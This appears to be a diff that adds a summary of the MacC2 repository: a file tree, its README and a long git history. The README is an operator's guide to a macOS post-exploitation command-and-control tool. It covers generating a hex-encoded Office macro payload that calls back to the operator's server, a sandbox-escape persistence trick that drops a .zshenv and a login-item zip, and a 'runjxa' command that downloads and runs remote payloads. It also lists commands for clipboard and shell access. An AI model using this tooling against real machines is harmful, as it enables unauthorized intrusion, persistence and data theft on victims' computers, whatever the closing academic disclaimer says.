@@ -1,0 +1,606 @@
+======================: FILES :======================
+.
+├── client-orig.py
+├── client.py
+├── Dockerfile
+├── img
+│   ├── pic30.png
+│   ├── pic31.png
+│   ├── pic32.png
+│   ├── pic33.png
+│   ├── pic3.png
+│   ├── pic4.png
+│   ├── pic5.png
+│   ├── pic6.png
+│   └── pic7.png
+├── install_docker_linux.sh
+├── LICENSE
+├── macro_generator.py
+├── README.md
+├── server.py
+└── setup.sh
+
+1 directory, 18 files
+======================: README CONTENT :======================
+# MacC2
+MacC2 is a macOS post exploitation tool written in python that uses Objective C calls or python libraries as opposed to command line executions. The client is written in python2, which though deprecated is still being shipped with base Big Sur installs. It is possible down the road that Apple will remove python2 (or python altogether) from base macOS installs but as of Nov 2020 this is not the case. Apple plans to eventually remove scripting runtimes from base macOS installs, but it is unknown when that will happen since Big Sur includes python. 
+
+------
+Latest Addition: May 2021
+
+- Added the MS Office Sandbox escape technique **discovered by Madhav Bhatt in his blog post at: https://desi-jarvis.medium.com/office365-macos-sandbox-escape-fcce4fa4123c**. 
+
+
+- Implementation in MacC2: When you get a callback from the MS Office macro payload (which will be sandboxed) and you run the ***persist*** command, MacC2 will drop two files to disk: **$HOME/\~$IT-Provision.zip** and **$HOME/Library/WebKit/\~$IT-Provision.py**. The .zip contains a .zshenv file, which runs the python payload at ~/Library/WebKit/~$IT-Provision.py. Once the system is rebooted, the .zip login item will automatically be extracted and drop the .zshenv file to the user's home directory, which will execute when a new terminal window is opened. 
+
+You can set up the server locally or you can use the docker setup I have included in this repo. Instructions below:
+
+-----
+## Instructions for Running Using Docker: ##
+
+***If you do not already have docker set up:***
+1. `chmod +x install_docker_linux.sh`
+2. `sudo ./install_docker_linux.sh`
+
+***Next:***
+1. `chmod +x setup.sh`
+2. `sudo ./setup.sh` **(this will create an untrusted ssl cert and key, generate a macro file for the server and port you specify (will drop the macro in macro.txt locally), build macc2-docker, and run the MacC2 server inside of macc2-container in interactive mode)**
+3. when prompted, enter the IP/hostname of the MacC2 server\
+![Image](img/pic30.png)
+4. when prompted, enter the port that the MacC2 server will listen on\
+![Image](img/pic31.png)
+5. A hex encoded macro payload will be dropped locally in a file named macro.txt that is configured to connect to your MacC2 server on the hostname/IP and port you specified.\
+![Image](img/pic32.png)
+6. Docker will install the aiohttp python3 dependency, build macc2-docker, and will run the MacC2 Server in a container. Once finished the MacC2 server will listen on the specified port:\
+![Image](img/pic33.png)
+7. You can run *docker ps* and validate that the MacC2 server is running
+8. The setup script also sets up a shared mount between the container and the host. On the host, you can browse to /var/lib/docker/volumes/macc2/_data in order to access MacC2_client.py as well as macro.txt which you will need to port over to the target host.
+
+
+You can then either copy the MacC2_client.py file over to the client and execute for a callback or you can import the macro.txt macro into an Office document and "Enable Macros" when opening for a callback on the client. 
+
+------
+## Running Locally (Without Using Docker) ##
+If you opt to not use docker, you can set up the server locally using the steps below:
+
+Since the MacC2 server uses the aiohttp library for communications, you will need to install aiohttp first:
+
+`pip install aiohttp` **(if you encounter an error ensure that pip is pointing to python3, since aiohttp is a python3 library)**: 
+
+`python3 -m pip install --upgrade --force pip`
+
+**_On C2 Server:_**
+1. Set up ssl (note: use a key size of at least 2048)
+
+If you do not have your own cert, you can use the following to generate a self signed cert:
+
+- 1: `openssl req -new -newkey rsa:2048 -nodes -out ca.csr -keyout ca.key`
+
+- 2: `openssl x509 -trustout -signkey ca.key -days 365 -req -in ca.csr -out ca.pem`
+
+**note: the server script is hard-coded to use ca.pem and ca.key, so keep these names the same for now, or change the code appropriately**
+
+2. Use macro_generator.py to create the MacC2 scripts with the server's IP/domain and port. macro_generator.py also builds a macro (macro.txt) that uses hex encoding to run MacC2. You can copy and paste the contents of macro.text into an MS Office document:
+
+Usage: 
+
+`python3 macro_generatory.py -s [C2 Server IP/domain] -p [C2 Server Port]`
+
+-Example:
+
+![Image](img/pic3.png)
+
+3. Start the generated MacC2_server.py script to listen for a connection:
+
+![Image](img/pic4.png)
+
+
+**_On Client Side (the target mac host):_**
+1. If you desire to not be limited by the mac sandbox and want more functionality, you may opt to copy the MacC2_client.py script to the client (assuming you have access).
+
+2. On the client, run the MacC2_client.py script: 
+`python MacC2_client.py`
+
+![Image](img/pic5.png)
+
+3. On the server, you will see an inbound connection. Example below:
+
+![Image](img/pic6.png)
+
+----------
+
+## Using MacC2 ##
+
+After you receive a connection, you can use the "help" command on the server to get a list of built-in commands available. You can enter one of these commands. After entering a command and pressing Enter, the command is queued up (allows you to enter multiple commands to be executed by the client). Once you type "done" and hit Enter, all of the queued commands will be sent to the client for execution.
+
+![Image](img/pic7.png)
+
+Each command is pretty straightforward. The command options that are not OPSEC safe (i.e., command line executions or cause pop ups) are also flagged in red from the help menu.
+
+Functions of Note:
+
+- You can generate a Mythic C2 JXA .js payload, download it, and host it on a remote server. Then you can provide the url to the hosted file to MacC2 using the **runjxa** command to have MacC2 download and execute the Mythic .JXA payload:
+
+`>>> runjxa <url_to_JXA_.js_payload>`
+
+**Note: If you gain access using the MS Office macro, then the persistence method will not work due to sandboxing. The files will still be dropped and the login item will still be inserted but upon reboot the quarantine attribute prevents the persistence from executing**
+
+----------
+
+## Additional Info ##
+
+The MacC2 server uses aiohttp to easily allow for asynchronous web comms. To ensure that only MacC2 agents can access the server, the server includes the following:
+
+- A specific user agent string check (if a request fails this check it receives a 404 Not Found)
+
+- A specific token (if a request failes this check it receives a 404 Not Found)
+
+The operator flow after setting everything up and getting a callback is:
+
+- view help menu for command options
+
+- enter command name and press enter for each command you want to run
+
+- enter "done" and press enter to have the queued commands sent to the client for execution
+
+- **NOTE: The default sleep is 10 seconds. The operator can change that by using the sleep [numberofseconds] command.**
+
+- NOTE: The MacC2 server currently does not have a way to conveniently switch between sessions when multiple clients connect. Instead the server auto switches between sessions after each command executed. So the operator will need to pay attention to the IP in the connection to know which session is being interacted with.
+
+
+----------
+
+## Macro Info ##
+
+**MacC2 includes the MS Office sandbox escape technique identified by Madhav Bhatt in his blog post at: https://desi-jarvis.medium.com/office365-macos-sandbox-escape-fcce4fa4123c**. However, if using the MS Office macro payload, the system must reboot in order for the escape to take effect. Functions that DO work from the sandbox include:
+
+- runjxa 
+
+- systeminfo
+
+- persist: MacC2 will drop two files to disk: ~/~$IT-Provision.zip and ~/Library/WebKit/~$IT-Provision.py. The .zip contains a .zshenv file, which runs the python payload at ~/Library/WebKit/~$IT-Provision.py. Once the system is rebooted, the .zip login item will automatically be extracted and drop the .zshenv file to the user's home directory, which will execute when a new terminal window is opened. 
+
+- addresses
+
+- prompt
+
+- clipboard
+
+- shell (not OPSEC safe)
+
+- spawn (not OPSEC safe)
+
+- cd and listdir (sandbox prevents access for most directories but you can see the root '/' directory and potentially others as well)
+
+----------
+
+**_DISCLAIMER_**
+
+This is for academic purposes and should not be used maliciously or without the appropriate authorizations and approvals.
+====================== GIT HISTORY: ======================
+c9fabd8 HEAD@{0}: clone: from https://github.com/cedowens/MacC2
+commit c9fabd8018b290590bccf0672cb83b9971a3de0f
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 22:00:13 2021 -0500
+
+    Update README.md
+
+commit 362dec86324ebb6b0f8662deb707d250c18e3944
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 21:57:02 2021 -0500
+
+    Update README.md
+
+commit cf62261968beef09fc15d709f7c4b9c864f66b86
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 21:55:43 2021 -0500
+
+    Update client-orig.py
+
+commit 55318e03750185562a3e23b8f8a24493d55435c2
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 21:49:55 2021 -0500
+
+    Update README.md
+
+commit 9dd0f16e2baf7d653f214b8de839fab888ed6b71
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 21:44:28 2021 -0500
+
+    Update README.md
+
+commit 9b91fe7e6dbcf92634a08674fd0960a3e9a351cd
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 21:38:39 2021 -0500
+
+    Update client.py
+
+commit 8ecc481aae3e61d51498daa0543f9da94d6f3903
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon May 10 21:37:15 2021 -0500
+
+    Add files via upload
+
+commit ab6e015e7d4945dfda18d9f075f6c3908ecdb7aa
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Mar 18 15:34:16 2021 -0500
+
+    Update README.md
+
+commit 032cd20b3182e4035bd08db3d28dc3050261ff44
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Mar 18 15:09:39 2021 -0500
+
+    Update client-orig.py
+
+commit 52fcd14b3f75676419c0aab7f9f8c1de2159f684
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Mar 18 15:08:07 2021 -0500
+
+    Update client.py
+
+commit 6d36770130f21ece90dfabee11a95503d75b6d94
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Mar 18 12:45:33 2021 -0500
+
+    Update client-orig.py
+
+commit dc3e1a8fd5d0eb8cbe29835677059df6ffd2d423
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Mar 18 12:44:28 2021 -0500
+
+    Update client.py
+
+commit 161e7b3216ff8369beb319052c8d3d230c293c5c
+Merge: 7a782cf 10e2c1f
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Tue Mar 2 09:14:02 2021 -0600
+
+    Merge pull request #2 from scottctaylor12/main
+    
+    cleanup pics and README doc
+
+commit 10e2c1f0b50dbc43cfb2376e31412b77a566683c
+Author: scottctaylor12 <scott.c.taylor12@gmail.com>
+Date:   Mon Mar 1 11:43:42 2021 -0500
+
+    cleanup pics and README doc
+
+commit 7a782cf256d3c404ec589571236092e071cd5411
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Feb 25 20:23:37 2021 -0600
+
+    Update README.md
+
+commit 5e719e10651e23630bcb44c81d95ca40a34f9e94
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Feb 11 15:54:37 2021 -0600
+
+    Update client-orig.py
+
+commit 411dde1299b256635310b6493a36adec510b5efe
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Feb 11 15:54:08 2021 -0600
+
+    Update client.py
+
+commit 441c118f850c317aba54115caccbec4d2fd1a19b
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Feb 11 15:53:10 2021 -0600
+
+    Update server.py
+
+commit 56caf8ae2ef86b5786037e5042744ce9cc79b8cb
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Feb 8 09:53:14 2021 -0600
+
+    Add files via upload
+    
+    macro_generator.py: fixed a bug so that the generator will properly work now for any port specified at the command line
+    
+    client-orig.py: used by macro_generator.py so that the find/replace functionality works across runs
+
+commit 40adc491a951941dc2be4f8fd38efbfe2d26e6d8
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Dec 28 17:30:00 2020 -0600
+
+    Update setup.sh
+
+commit c6036f28d619b7c578293700f0c2960d2805e53d
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Dec 28 17:23:22 2020 -0600
+
+    Update setup.sh
+
+commit 35c2c1a4711c63772b01747c4e499f2d2c222796
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Dec 28 17:14:42 2020 -0600
+
+    Update setup.sh
+
+commit eb3ae89ac063facdfb85ee4d818010d26502320c
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Dec 28 17:14:18 2020 -0600
+
+    Update Dockerfile
+
+commit ceff78921e3f2783df6a6c6311490cb97586a506
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Dec 24 16:31:51 2020 -0600
+
+    Update setup.sh
+
+commit d02710efd20e7422c78b2be6bb0138aece26a1e9
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Dec 23 01:38:06 2020 -0500
+
+    Update setup.sh
+
+commit d6cfefaeb088ef6938fff406a94b3f00bf764371
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Dec 23 01:29:34 2020 -0500
+
+    Update README.md
+
+commit f0f2255c9b741eb87e38e985455bccee159b3397
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Dec 23 01:25:47 2020 -0500
+
+    Update setup.sh
+
+commit cf0d2076dd652f896884a63fc648ffdf896091c9
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Dec 23 01:23:11 2020 -0500
+
+    Update Dockerfile
+
+commit eb57e56da4031d0de432312550c8be469b1f3fb8
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sat Dec 19 19:43:19 2020 -0600
+
+    Update README.md
+
+commit e5b0aa234bd679170b04b0b019e031caaefe8a41
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Tue Dec 8 15:17:43 2020 -0600
+
+    Update client.py
+    
+    minor change to the prompt function
+
+commit 2af0d34e91e14c6e464942e8866528ed28c5b1f8
+Merge: 2c5f368 2b7dcc8
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Dec 3 11:13:17 2020 -0600
+
+    Merge pull request #1 from cedowens/add-license-1
+    
+    Create LICENSE
+
+commit 2c5f368bfd893b181a517f7eee8a3965b09f2352
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Dec 3 11:11:34 2020 -0600
+
+    Create LICENSE
+
+commit 2b7dcc864e8512ab87bb8db4c158985f170c6a48
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Dec 3 11:11:09 2020 -0600
+
+    Create LICENSE
+
+commit 2ca6dc31a84522e9042f382430d4054b693c3e4d
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 22 10:00:35 2020 -0500
+
+    Update server.py
+
+commit 18ba8f2410c4a0804964d48fe0399248abf54def
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 22 09:58:18 2020 -0500
+
+    Update client.py
+
+commit 0e2aab07310327c0c4690aa47f69eced9a5d2998
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sat Nov 21 09:59:04 2020 -0500
+
+    Update macro_generator.py
+
+commit 45ef2a55314ce31c020aefc7507d8f8ffb439091
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 15 18:34:05 2020 -0500
+
+    Update README.md
+
+commit 56a798687e99450baefbfd47ee0a3472c4df8643
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Nov 12 14:21:55 2020 -0600
+
+    Update README.md
+
+commit e4f9447e90e96c297868f340db34335bbc1b9f29
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Thu Nov 12 14:18:00 2020 -0600
+
+    Update client.py
+
+commit 7d5ab29fd07202fde4a30ee49c523b1a9de9bae3
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Nov 11 16:37:35 2020 -0600
+
+    Update README.md
+
+commit 3abdef3b6ae90106752e7a227b6a6c74b0374f2f
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Nov 11 15:45:50 2020 -0600
+
+    Update README.md
+
+commit fa769d2027a9477f98d1cfb2a82c08d945f7be54
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Nov 11 10:05:08 2020 -0600
+
+    Update README.md
+
+commit c16c301450673a6a197b784cd1701e237859f141
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Nov 11 10:00:26 2020 -0600
+
+    Update README.md
+
+commit 3548ffa8f979caa0a92b5ef91a09bbe1e266826b
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Nov 11 09:59:51 2020 -0600
+
+    Update server.py
+
+commit d1c8965d25660c4386d2448b7710ba2e9acb2c34
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Nov 11 09:58:02 2020 -0600
+
+    Update client.py
+
+commit 6598f10048c28937ed83eb1db32244c0285a0324
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 8 12:40:27 2020 -0600
+
+    Update README.md
+
+commit 5caa9cbe0180c040cf73ff9a339ed0054a30ae11
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 8 12:38:07 2020 -0600
+
+    Update README.md
+
+commit 133d3960ac3344bb786d2d6e23c3010341aae144
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 8 12:36:31 2020 -0600
+
+    Update README.md
+
+commit d93b0b289147239a60b29dea13b8cef5a281ed2e
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 8 12:29:58 2020 -0600
+
+    Update README.md
+
+commit 398e6b1299473d49fde96d9061a8c23e827ebe94
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 8 12:24:15 2020 -0600
+
+    Update README.md
+
+commit 89ae44d1e2e2a4fd06390a37a9f2737ec12c8477
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sun Nov 8 12:23:30 2020 -0600
+
+    Update README.md
+
+commit b928fc9cd12d08d3d564c50c67bf829e0bc79cdf
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sat Nov 7 18:06:24 2020 -0600
+
+    Update README.md
+
+commit 655d0b5a06781a62ed2234851cfb2532765dcf72
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sat Nov 7 19:02:26 2020 -0500
+
+    Add files via upload
+
+commit 5bf9af873069231b37923c8a113f5b8e116c33ba
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sat Nov 7 18:01:56 2020 -0600
+
+    Update README.md
+
+commit 78a6f19146a37cb635cb5a3564496da1d2251fcf
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Sat Nov 7 18:41:27 2020 -0500
+
+    Add files via upload
+
+commit 7f70362d383a079cef497626187c6aabc88746b3
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Wed Oct 28 09:16:10 2020 -0500
+
+    Update README.md
+
+commit c5a771983e36b6187400ae6aecb8f5165477dd0f
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Oct 19 17:13:34 2020 -0500
+
+    Update README.md
+
+commit f83efa5740e5f41e8ea05fc672cdbe969ff24467
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Oct 19 17:01:23 2020 -0500
+
+    Update README.md
+
+commit b25a180a88885c8d27bf68385bc2b7992a47e22b
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Oct 19 16:52:18 2020 -0500
+
+    Add files via upload
+
+commit 0579e8e25f6b8c72c02caa419c87a8ca068bce81
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Oct 19 16:51:09 2020 -0500
+
+    Add files via upload
+
+commit 94eac2f1444c850e0b93f8ac0a6045f15089f176
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Mon Oct 19 16:44:57 2020 -0500
+
+    Add files via upload
+
+commit d8d36306018a191d9a0afac89133272661024b84
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 14:26:54 2020 -0500
+
+    Update README.md
+
+commit fbf1ce0da1e8a58553316e008cf02b03678871e1
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 13:32:15 2020 -0500
+
+    Update README.md
+
+commit bac99cb1d5be308de971bd91a7ca7fe9eba047c1
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 13:02:22 2020 -0500
+
+    Update README.md
+
+commit a5cf4126e4f2c9316b8df1efae32833fb8317468
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 13:00:21 2020 -0500
+
+    Add files via upload
+
+commit 535e14b18f87392a09fc845bd31025292577b0e6
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 12:55:47 2020 -0500
+
+    Add files via upload
+
+commit b5e909424414031cdbd0f356dde4f33b9e4be6dc
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 12:55:12 2020 -0500
+
+    Update README.md
+
+commit ebf1cb5e201bc833ac4c4b4a9b3e0f3d6bae78ec
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 12:33:36 2020 -0500
+
+    Update README.md
+
+commit 9b6a8bc19d1c393bbc4a3d21c2da23f98384931c
+Author: Cedric Owens <41086586+cedowens@users.noreply.github.com>
+Date:   Fri Oct 9 12:14:18 2020 -0500
+
+    Initial commit
